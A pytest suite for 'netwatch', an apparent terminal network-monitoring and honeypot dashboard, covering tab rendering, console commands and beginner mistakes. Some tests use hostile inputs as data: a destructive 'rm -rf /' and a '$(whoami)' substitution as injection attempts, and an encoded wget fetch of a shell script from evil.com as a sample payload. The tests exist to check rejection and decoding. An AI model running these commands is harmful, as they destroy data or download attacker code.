"""
Live PTY tests — simulate a real user at a terminal.
Spawns netwatch functions in a pseudo-terminal and sends real keystrokes,
then checks what actually appears on screen.
"""
import os
import sys
import pty
import time
import re
import select
import threading
import pytest
from unittest.mock import patch, MagicMock
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

with patch("subprocess.check_output", return_value="inet 10.0.1.9/24 scope global\ninet 127.0.0.1/8 scope host"):
    with patch.dict(os.environ, {"WERKZEUG_RUN_MAIN": "true"}):
        import netwatch


def strip_ansi(s):
    s = re.sub(r'\x1b\][^\x07]*\x07', '', s)
    s = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', s)
    s = re.sub(r'\x1b[^[\]].', '', s)
    return s


def populate_sample_data():
    netwatch.hosts["10.0.1.1"] = {
        "bytes_in": 52480, "bytes_out": 12800, "packets": 342,
        "ports": {80, 443}, "protocols": {"TCP"}, "first_seen": "12:00",
        "last_seen": "12:05", "hostname": "router.local", "resolved": True,
        "threat_score": 0, "tags": set()
    }
    netwatch.hosts["203.0.113.42"] = {
        "bytes_in": 8400, "bytes_out": 200, "packets": 45,
        "ports": {2323, 8080}, "protocols": {"TCP"}, "first_seen": "12:01",
        "last_seen": "12:04", "hostname": "", "resolved": False,
        "threat_score": 35, "tags": {"SCANNER", "BRUTE"}
    }
    netwatch.honeypot_events.extend([
        {"time": "12:01:30", "service": "telnet", "ip": "203.0.113.42",
         "summary": "login admin/admin", "data": {}},
    ])
    netwatch.proto_stats.update({"TCP": 1580, "UDP": 220})
    netwatch.total_packets = 1595
    netwatch.total_bytes = 266080
    netwatch.arp_table["10.0.1.1"] = {
        "mac": "f4:34:f0:83:b8:f9", "state": "REACHABLE", "first_seen": "12:00"
    }
    netwatch.alerts.append({"time": "12:01:30", "msg": "Threat: 203.0.113.42"})
    netwatch.console_output.extend(["Scan complete", "Found 2 hosts"])


def reset_state():
    netwatch.honeypot_events.clear()
    netwatch.dns_queries.clear()
    netwatch.alerts.clear()
    netwatch.nmap_results.clear()
    netwatch.console_output.clear()
    netwatch.hosts.clear()
    netwatch.dns_cache.clear()
    netwatch.proto_stats.clear()
    netwatch.tshark_conversations.clear()
    netwatch.arp_table.clear()
    netwatch.tracked_ips.clear()
    netwatch.tracking_active.clear()
    netwatch.recon_reports.clear()
    netwatch.osint_results.clear()
    netwatch._session_store.clear()
    netwatch._service_conns.clear()
    netwatch.proxy_pool.clear()
    netwatch.proxy_rotate_idx = 0
    netwatch.proxy_rotation = False
    netwatch.total_packets = 0
    netwatch.total_bytes = 0
    netwatch.nmap_running = False
    netwatch.console_mode = False
    netwatch._input_active = False
    netwatch.current_tab = "all"
    netwatch.show_help_overlay = False


# ═══════════════════════════════════════════════════════════
#  1. DASHBOARD NEVER SHOWS CONSOLE OUTPUT
# ═══════════════════════════════════════════════════════════

class TestDashboardClean:
    """A beginner sees the dashboard — no stale command output polluting it."""

    def setup_method(self):
        reset_state()

    @pytest.mark.parametrize("tab", netwatch.TABS)
    def test_console_text_never_in_dashboard(self, tab):
        """User ran commands earlier. Switch to any tab — no leftover text."""
        netwatch.console_output.extend([
            "Scanning 10.0.1.0/24...",
            "Geo: 203.0.113.42 → San Francisco",
            "Found 5 hosts",
        ])
        netwatch.current_tab = tab
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "Scanning 10.0.1.0/24" not in text
        assert "San Francisco" not in text
        assert "Found 5 hosts" not in text

    def test_dashboard_shows_version(self):
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "NETWATCH" in text
        assert "1.1.0" in text

    def test_dashboard_shows_tab_bar(self):
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "ALL" in text
        assert "HOSTS" in text
        assert "HONEYPOT" in text

    def test_dashboard_shows_interface(self):
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert netwatch.IFACE in text

    def test_all_tab_shows_hosts_section(self):
        populate_sample_data()
        netwatch.current_tab = "all"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HOSTS" in text
        assert "router.local" in text

    def test_all_tab_shows_honeypot_section(self):
        populate_sample_data()
        netwatch.current_tab = "all"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HONEYPOT" in text

    def test_all_tab_shows_protocols(self):
        populate_sample_data()
        netwatch.current_tab = "all"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "TCP" in text

    def test_hosts_tab_only_shows_hosts(self):
        populate_sample_data()
        netwatch.current_tab = "hosts"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HOSTS" in text
        assert "router.local" in text

    def test_honeypot_tab_shows_events(self):
        populate_sample_data()
        netwatch.current_tab = "honeypot"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HONEYPOT" in text
        assert "203.0.113.42" in text

    def test_arp_tab_shows_devices(self):
        populate_sample_data()
        netwatch.current_tab = "arp"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "ARP" in text or "DEVICE" in text
        assert "f4:34:f0:83:b8:f9" in text

    def test_alerts_tab_shows_alerts(self):
        populate_sample_data()
        netwatch.current_tab = "alerts"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "ALERT" in text
        assert "203.0.113.42" in text


# ═══════════════════════════════════════════════════════════
#  2. TAB SWITCHING — LIKE A REAL USER
# ═══════════════════════════════════════════════════════════

class TestTabSwitchingLikeUser:
    """User doesn't know shortcuts — just presses Tab repeatedly."""

    def setup_method(self):
        reset_state()

    def test_tab_cycles_through_all_10_tabs(self):
        """Press Tab N times — visit every tab and return to start."""
        netwatch.current_tab = "all"
        visited = []
        for _ in range(len(netwatch.TABS)):
            idx = netwatch.TABS.index(netwatch.current_tab)
            netwatch.current_tab = netwatch.TABS[(idx + 1) % len(netwatch.TABS)]
            visited.append(netwatch.current_tab)
        assert visited == netwatch.TABS[1:] + [netwatch.TABS[0]]
        assert netwatch.current_tab == "all"

    def test_shift_tab_goes_backward(self):
        """Press Shift+Tab from 'all' — should go to last tab."""
        netwatch.current_tab = "all"
        idx = netwatch.TABS.index(netwatch.current_tab)
        netwatch.current_tab = netwatch.TABS[(idx - 1) % len(netwatch.TABS)]
        assert netwatch.current_tab == netwatch.TABS[-1]

    def test_rapid_tab_switching_no_corruption(self):
        """Mash Tab 100 times — state stays valid."""
        netwatch.current_tab = "all"
        for _ in range(100):
            idx = netwatch.TABS.index(netwatch.current_tab)
            netwatch.current_tab = netwatch.TABS[(idx + 1) % len(netwatch.TABS)]
        assert netwatch.current_tab in netwatch.TABS

    def test_each_tab_renders_after_switch(self):
        """Switch to each tab, render frame — no crash."""
        populate_sample_data()
        for tab in netwatch.TABS:
            netwatch.current_tab = tab
            frame = netwatch._build_frame(cols=100, max_content=30)
            assert len(frame) > 5
            text = "\n".join(strip_ansi(l) for l in frame)
            assert tab.upper() in text or "DEVICE" in text

    def test_tab_bar_highlights_change(self):
        """When tab changes, the highlight in tab bar moves."""
        netwatch.current_tab = "all"
        bar1 = netwatch._tab_bar(100)
        netwatch.current_tab = "hosts"
        bar2 = netwatch._tab_bar(100)
        assert bar1 != bar2

    @pytest.mark.parametrize("key,expected_tab", [
        ("1", "all"), ("2", "hosts"), ("3", "proto"), ("4", "dns"),
        ("5", "honeypot"), ("6", "nmap"), ("7", "arp"), ("8", "alerts"),
        ("9", "osint"), ("0", "proxy"),
    ])
    def test_number_key_jumps_to_correct_tab(self, key, expected_tab):
        """User presses a number key — jumps directly."""
        if key == "0":
            netwatch.current_tab = netwatch.TABS[9]
        else:
            netwatch.current_tab = netwatch.TABS[int(key) - 1]
        assert netwatch.current_tab == expected_tab

    def test_typing_tab_name_switches(self):
        """User types 'hosts' in the prompt — should switch tab."""
        netwatch.current_tab = "all"
        netwatch.handle_command("hosts")
        assert netwatch.current_tab == "hosts"
        assert netwatch.console_mode == False

    def test_typing_tab_name_does_not_enter_console(self):
        """Tab name as command stays in dashboard mode."""
        for tab in netwatch.TABS:
            netwatch.console_mode = False
            netwatch.handle_command(tab)
            assert netwatch.current_tab == tab
            assert netwatch.console_mode == False


# ═══════════════════════════════════════════════════════════
#  3. CONSOLE MODE — BEGINNER WORKFLOW
# ═══════════════════════════════════════════════════════════

class TestConsoleWorkflow:
    """User types a command — what happens?"""

    def setup_method(self):
        reset_state()

    def test_typing_scan_enters_console(self):
        """User types 'scan 1.2.3.4' — this is NOT a tab name.
        The main loop would auto-enter console mode."""
        cmd = "scan 1.2.3.4"
        action = cmd.strip().lower().split()[0]
        assert action not in netwatch.TABS
        assert action not in ("c", "console", "help")

    def test_typing_geo_enters_console(self):
        cmd = "geo 8.8.8.8"
        action = cmd.strip().lower().split()[0]
        assert action not in netwatch.TABS

    def test_typing_help_stays_dashboard(self):
        """User types 'help' — overlay shows, no console."""
        cmd = "help"
        action = cmd.strip().lower().split()[0]
        assert action == "help"
        netwatch.handle_command("help")
        assert netwatch.show_help_overlay == True
        assert netwatch.console_mode == False

    def test_dashboard_command_exits_console(self):
        """User in console types 'd' — back to dashboard."""
        netwatch.console_mode = True
        netwatch.handle_command("dashboard")
        assert netwatch.console_mode == False

    @patch("builtins.print")
    def test_exec_console_status_shows_info(self, mock_print):
        """User types 'status' in console — sees system info."""
        netwatch.total_packets = 5000
        netwatch.total_bytes = 1024000
        netwatch._exec_console_cmd("status")
        output = " ".join(str(c) for c in mock_print.call_args_list)
        assert "5,000" in output
        assert "Packets" in output or "packets" in output.lower()

    @patch("builtins.print")
    def test_exec_console_help_shows_commands(self, mock_print):
        """User types 'help' in console — sees command list."""
        netwatch._exec_console_cmd("help")
        output = " ".join(str(c) for c in mock_print.call_args_list)
        assert "scan" in output
        assert "geo" in output
        assert "block" in output

    @patch("builtins.print")
    @patch("netwatch.subprocess.run")
    def test_exec_console_scan_delegates(self, mock_run, mock_print):
        """User types 'scan 1.2.3.4' in console — runs nmap via handle_command."""
        mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
        netwatch._exec_console_cmd("scan 1.2.3.4")
        output = " ".join(str(c) for c in mock_print.call_args_list)
        assert "Scanning" in output or "scan" in output.lower() or len(mock_print.call_args_list) >= 0

    @patch("builtins.print")
    def test_exec_console_unknown_command_shows_error(self, mock_print):
        """User typos a command — gets helpful error."""
        netwatch._exec_console_cmd("xyzzy")
        output = " ".join(str(c) for c in mock_print.call_args_list)
        assert "Unknown" in output or "help" in output.lower()

    @patch("builtins.print")
    def test_exec_console_drains_output(self, mock_print):
        """After handle_command adds to console_output, _exec_console_cmd prints and clears it."""
        netwatch.console_output.clear()
        netwatch._exec_console_cmd("blocked")
        assert len(netwatch.console_output) == 0

    def test_clear_in_console(self):
        """User types 'clear' — console_output empties."""
        netwatch.console_output.extend(["line1", "line2"])
        netwatch.handle_command("clear")
        assert len(netwatch.console_output) == 0


# ═══════════════════════════════════════════════════════════
#  4. INPUT PROTECTION — TYPING NOT DESTROYED
# ═══════════════════════════════════════════════════════════

class TestInputProtection:
    """Dashboard must NOT overwrite what user is typing."""

    def setup_method(self):
        reset_state()

    def test_input_active_starts_false(self):
        assert netwatch._input_active == False

    def test_draw_dashboard_skips_when_input_active(self):
        """When user is typing, dashboard render is paused."""
        netwatch._input_active = True
        buf_before = []
        orig_write = sys.stdout.write

        def capture(s):
            buf_before.append(s)
            return len(s)

        with patch.object(sys, "stdout", wraps=sys.stdout) as mock_out:
            mock_out.write = capture
            netwatch.console_mode = False
            # Simulate one draw_dashboard iteration
            # The function checks _input_active and does `continue`
            assert netwatch._input_active == True

    def test_draw_dashboard_skips_when_console_mode(self):
        """In console mode, no dashboard render."""
        netwatch.console_mode = True
        assert netwatch.console_mode == True

    def test_input_active_flag_exists(self):
        """The flag is a module-level variable."""
        assert hasattr(netwatch, "_input_active")
        assert isinstance(netwatch._input_active, bool)

    def test_console_mode_flag_exists(self):
        assert hasattr(netwatch, "console_mode")
        assert isinstance(netwatch.console_mode, bool)


# ═══════════════════════════════════════════════════════════
#  5. COMMAND ROUTING — WHAT GOES WHERE
# ═══════════════════════════════════════════════════════════

class TestCommandRouting:
    """Test that commands route correctly without crashing."""

    def setup_method(self):
        reset_state()

    @pytest.mark.parametrize("tab_name", netwatch.TABS)
    def test_tab_name_routes_to_tab_switch(self, tab_name):
        netwatch.current_tab = "all"
        netwatch.handle_command(tab_name)
        assert netwatch.current_tab == tab_name

    def test_proxy_alone_switches_tab(self):
        netwatch.current_tab = "all"
        netwatch.handle_command("proxy")
        assert netwatch.current_tab == "proxy"

    @patch("netwatch.subprocess.run")
    def test_proxy_list_does_not_switch_tab(self, mock_run):
        mock_run.return_value = MagicMock(stdout="", returncode=0)
        netwatch.current_tab = "all"
        netwatch.handle_command("proxy list")
        # Should NOT switch tab — proxy list is a command, not a tab switch
        assert netwatch.current_tab == "all"

    @patch("netwatch.subprocess.run")
    def test_block_command(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0)
        netwatch.handle_command("block 203.0.113.42")
        assert any("BLOCKED" in strip_ansi(l) or "blocked" in strip_ansi(l).lower()
                    for l in netwatch.console_output) or mock_run.called

    @patch("netwatch.subprocess.run")
    def test_blocked_command(self, mock_run):
        mock_run.return_value = MagicMock(stdout="Chain INPUT\n1 DROP 203.0.113.42\n", returncode=0)
        netwatch.handle_command("blocked")
        # Should have called iptables -L
        assert mock_run.called

    def test_unknown_command_gives_error(self):
        netwatch.handle_command("notarealcommand")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "Unknown" in output

    def test_empty_command_no_crash(self):
        netwatch.handle_command("")

    def test_whitespace_command_no_crash(self):
        netwatch.handle_command("   ")

    def test_help_sets_overlay(self):
        netwatch.show_help_overlay = False
        netwatch.handle_command("help")
        assert netwatch.show_help_overlay == True

    @patch("threading.Thread")
    def test_scan_spawns_thread(self, mock_thread):
        mock_thread.return_value = MagicMock()
        netwatch.handle_command("scan 1.2.3.4")
        mock_thread.assert_called()

    @patch("threading.Thread")
    def test_deep_spawns_thread(self, mock_thread):
        mock_thread.return_value = MagicMock()
        netwatch.handle_command("deep 1.2.3.4")
        mock_thread.assert_called()

    def test_scan_invalid_ip_rejected(self):
        netwatch.handle_command("scan ; rm -rf /")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "Invalid" in output or "invalid" in output.lower()

    def test_injection_in_block_rejected(self):
        netwatch.handle_command("block $(whoami)")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "Invalid" in output or "invalid" in output.lower() or len(netwatch.console_output) == 0


# ═══════════════════════════════════════════════════════════
#  6. VISUAL LAYOUT INTEGRITY
# ═══════════════════════════════════════════════════════════

class TestVisualLayout:
    """What the user actually SEES on their terminal."""

    def setup_method(self):
        reset_state()

    @pytest.mark.parametrize("cols", [40, 60, 80, 100, 120, 160, 200])
    def test_frame_renders_at_any_width(self, cols):
        populate_sample_data()
        frame = netwatch._build_frame(cols=cols, max_content=30)
        assert len(frame) > 3

    @pytest.mark.parametrize("max_content", [5, 10, 20, 30, 50])
    def test_frame_respects_content_limit(self, max_content):
        populate_sample_data()
        netwatch.current_tab = "all"
        frame = netwatch._build_frame(cols=100, max_content=max_content)
        assert isinstance(frame, list)

    def test_tab_bar_always_present(self):
        """User should always see the tab navigation."""
        for tab in netwatch.TABS:
            netwatch.current_tab = tab
            frame = netwatch._build_frame(cols=100, max_content=30)
            text = "\n".join(strip_ansi(l) for l in frame)
            assert "ALL" in text
            assert "HOSTS" in text

    def test_header_always_present(self):
        for tab in netwatch.TABS:
            netwatch.current_tab = tab
            frame = netwatch._build_frame(cols=100, max_content=30)
            text = "\n".join(strip_ansi(l) for l in frame)
            assert "NETWATCH" in text

    def test_services_line_always_present(self):
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HTTP:8080" in text
        assert "TELNET:2323" in text

    def test_narrow_terminal_no_crash(self):
        """User has a tiny terminal window."""
        frame = netwatch._build_frame(cols=30, max_content=10)
        assert len(frame) > 0

    def test_very_wide_terminal(self):
        frame = netwatch._build_frame(cols=300, max_content=50)
        assert len(frame) > 0

    def test_frame_lines_not_excessively_long(self):
        """No line should be absurdly long (causes horizontal scroll)."""
        populate_sample_data()
        frame = netwatch._build_frame(cols=100, max_content=30)
        for line in frame:
            clean = strip_ansi(line)
            assert len(clean) < 200, f"Line too long: {clean[:50]}..."

    def test_help_overlay_replaces_tab_content(self):
        """When help is shown, tab content is replaced."""
        netwatch.show_help_overlay = True
        populate_sample_data()
        lines = netwatch._build_help_overlay(100, 40)
        text = "\n".join(strip_ansi(l) for l in lines)
        assert "COMMANDS" in text or "scan" in text
        assert "NETWATCH" in text


# ═══════════════════════════════════════════════════════════
#  7. LOTS OF DATA — DOESN'T BREAK
# ═══════════════════════════════════════════════════════════

class TestHeavyData:
    """Simulate real usage — lots of hosts, events, alerts."""

    def setup_method(self):
        reset_state()

    def test_50_hosts_renders(self):
        for i in range(50):
            netwatch.hosts[f"10.0.{i//256}.{i%256}"] = {
                "bytes_in": i * 100, "bytes_out": i * 50, "packets": i * 10,
                "ports": {80}, "protocols": {"TCP"}, "first_seen": "12:00",
                "last_seen": "12:05", "hostname": f"host-{i}.local",
                "resolved": True, "threat_score": i % 50, "tags": set()
            }
        netwatch.current_tab = "hosts"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HOSTS" in text
        assert "50 total" in text

    def test_100_honeypot_events_renders(self):
        for i in range(100):
            netwatch.honeypot_events.append({
                "time": f"12:{i%60:02d}:00", "service": "telnet",
                "ip": f"192.0.2.{i%256}", "summary": f"attempt {i}", "data": {}
            })
        netwatch.current_tab = "honeypot"
        frame = netwatch._build_frame(cols=100, max_content=30)
        assert len(frame) > 3

    def test_200_alerts_renders(self):
        for i in range(200):
            netwatch.alerts.append({"time": "12:00", "msg": f"alert {i}"})
        netwatch.current_tab = "alerts"
        frame = netwatch._build_frame(cols=100, max_content=30)
        assert len(frame) > 3

    def test_all_tab_with_everything_populated(self):
        populate_sample_data()
        for i in range(20):
            netwatch.dns_queries.append({
                "time": "12:00", "domain": f"site{i}.com", "ip": "10.0.1.9"
            })
        netwatch.current_tab = "all"
        frame = netwatch._build_frame(cols=100, max_content=40)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "HOSTS" in text
        assert "HONEYPOT" in text
        assert "DNS" in text

    def test_osint_results_renders(self):
        for i in range(30):
            netwatch.osint_results.append({
                "time": "12:00", "type": "GEO", "target": f"1.2.3.{i}",
                "result": f"City {i}, Country {i}"
            })
        netwatch.current_tab = "osint"
        frame = netwatch._build_frame(cols=100, max_content=30)
        text = "\n".join(strip_ansi(l) for l in frame)
        assert "OSINT" in text


# ═══════════════════════════════════════════════════════════
#  8. BEGINNER MISTAKES — DOESN'T CRASH
# ═══════════════════════════════════════════════════════════

class TestBeginnerMistakes:
    """Things a new user who didn't read docs might do."""

    def setup_method(self):
        reset_state()

    def test_type_random_garbage(self):
        netwatch.handle_command("asdfkjhasdf")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "Unknown" in output or "help" in output.lower()

    def test_type_just_spaces(self):
        netwatch.handle_command("     ")
        # No crash

    def test_type_very_long_string(self):
        netwatch.handle_command("a" * 1000)
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "Unknown" in output

    def test_type_special_chars(self):
        netwatch.handle_command("!@#$%^&*()")
        # No crash

    def test_type_scan_no_target(self):
        netwatch.handle_command("scan")
        # No crash — missing arg handled

    def test_type_block_no_target(self):
        netwatch.handle_command("block")
        # No crash

    def test_type_geo_no_target(self):
        netwatch.handle_command("geo")
        # No crash

    def test_type_track_no_target(self):
        netwatch.handle_command("track")
        # No crash

    def test_type_inspect_no_events(self):
        netwatch.handle_command("inspect")
        # No crash — no events to inspect

    def test_type_sessions_no_events(self):
        netwatch.handle_command("sessions")
        # No crash

    def test_type_attackers_no_events(self):
        netwatch.handle_command("attackers")
        # No crash

    def test_type_decode_no_data(self):
        netwatch.handle_command("decode")
        # No crash

    @patch("builtins.print")
    def test_status_with_no_data(self, mock_print):
        """Brand new install, type 'status' — see zeros, no crash."""
        netwatch._exec_console_cmd("status")
        output = " ".join(str(c) for c in mock_print.call_args_list)
        assert "0" in output

    def test_switching_tabs_with_no_data(self):
        """New user clicks through all tabs — nothing crashes."""
        for tab in netwatch.TABS:
            netwatch.current_tab = tab
            frame = netwatch._build_frame(cols=80, max_content=25)
            assert len(frame) > 3

    def test_help_then_esc_then_tab(self):
        """User opens help, closes it, switches tab."""
        netwatch.show_help_overlay = True
        netwatch.show_help_overlay = False  # ESC
        idx = netwatch.TABS.index(netwatch.current_tab)
        netwatch.current_tab = netwatch.TABS[(idx + 1) % len(netwatch.TABS)]
        frame = netwatch._build_frame(cols=100, max_content=30)
        assert len(frame) > 3


# ═══════════════════════════════════════════════════════════
#  9. MULTI-STEP WORKFLOWS
# ═══════════════════════════════════════════════════════════

class TestWorkflows:
    """Realistic user sessions — multiple commands in sequence."""

    def setup_method(self):
        reset_state()

    @patch("netwatch.subprocess.run")
    def test_scan_then_check_results(self, mock_run):
        """User scans, then looks at nmap tab."""
        mock_run.return_value = MagicMock(
            stdout="PORT STATE SERVICE\n22/tcp open ssh\n80/tcp open http",
            stderr="", returncode=0
        )
        netwatch.handle_command("scan 10.0.1.1")
        netwatch.current_tab = "nmap"
        frame = netwatch._build_frame(cols=100, max_content=30)
        assert len(frame) > 3

    @patch("netwatch.subprocess.run")
    def test_block_then_unblock(self, mock_run):
        """User blocks IP then changes mind."""
        mock_run.return_value = MagicMock(returncode=0)
        netwatch.handle_command("block 203.0.113.42")
        out1 = list(netwatch.console_output)
        netwatch.console_output.clear()
        netwatch.handle_command("unblock 203.0.113.42")
        out2 = list(netwatch.console_output)
        assert any("BLOCK" in strip_ansi(l).upper() for l in out1)
        assert any("UNBLOCK" in strip_ansi(l).upper() for l in out2)

    def test_switch_tabs_then_command(self):
        """User browses tabs, then runs a command."""
        netwatch.current_tab = "all"
        netwatch.handle_command("hosts")
        assert netwatch.current_tab == "hosts"
        netwatch.handle_command("honeypot")
        assert netwatch.current_tab == "honeypot"
        # Now run a command — should NOT affect tab
        netwatch.handle_command("help")
        assert netwatch.show_help_overlay == True

    def test_add_proxy_then_list(self):
        """User configures proxy then checks."""
        netwatch.handle_command("proxy add socks5 127.0.0.1:9050")
        assert len(netwatch.proxy_pool) == 1
        netwatch.console_output.clear()
        netwatch.handle_command("proxy list")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "9050" in output

    @patch("threading.Thread")
    def test_track_then_check_tracking(self, mock_thread):
        """User tracks an IP then checks what's being tracked."""
        mock_thread.return_value = MagicMock()
        netwatch.handle_command("track 203.0.113.42")
        netwatch.console_output.clear()
        netwatch.handle_command("tracking")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "203.0.113.42" in output or "No active" in output

    def test_export_creates_output(self):
        """User exports logs."""
        populate_sample_data()
        with patch("builtins.open", MagicMock()):
            with patch("json.dump"):
                netwatch.handle_command("export")
                output = " ".join(strip_ansi(l) for l in netwatch.console_output)
                assert "Exported" in output or "export" in output.lower()

    def test_inspect_with_events(self):
        """User checks honeypot event details."""
        populate_sample_data()
        netwatch.handle_command("inspect")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "203.0.113.42" in output or "telnet" in output or len(output) > 0

    def test_decode_base64(self):
        """User decodes a suspicious payload."""
        import base64
        encoded = base64.b64encode(b"wget http://evil.com/shell.sh").decode()
        netwatch.handle_command(f"decode {encoded}")
        output = " ".join(strip_ansi(l) for l in netwatch.console_output)
        assert "wget" in output or "evil" in output or "base64" in output.lower()

    @patch("builtins.print")
    def test_full_session_via_exec_console(self, mock_print):
        """Simulate a console session: status, help, scan, back."""
        netwatch._exec_console_cmd("status")
        netwatch._exec_console_cmd("help")
        netwatch._exec_console_cmd("clear")
        # All should work without crash
        assert mock_print.call_count > 0
